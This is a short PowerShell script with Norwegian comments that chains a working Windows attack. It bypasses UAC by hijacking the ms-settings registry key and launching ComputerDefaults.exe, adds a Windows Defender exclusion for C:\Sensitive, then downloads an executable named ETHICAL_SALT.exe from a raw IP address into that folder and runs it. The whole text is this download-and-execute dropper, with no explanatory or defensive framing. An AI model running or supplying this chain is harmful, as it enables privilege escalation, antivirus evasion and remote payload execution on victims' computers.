# UAC Bypass delen
New-Item "HKCU:\software\classes\ms-settings\shell\open\command" -Force
New-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "DelegateExecute" -Value "" -Force
Set-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "(default)" -Value "C:\Path\To\yourExecutable.exe" -Force
Start-Process "C:\Windows\System32\ComputerDefaults.exe"

# Legge til eksklusjon i Windows Defender
Add-MpPreference -ExclusionPath "C:\Sensitive"

# Last ned en fil fra en ekstern kilde
$url = "http://164.92.154.140/ETHICAL_SALT.exe"
$downloadPath = "C:\Sensitive\ETHICAL_SALT.exe"
Invoke-WebRequest -Uri $url -OutFile $downloadPath

# Kjør den nedlastede filen
Start-Process $downloadPath

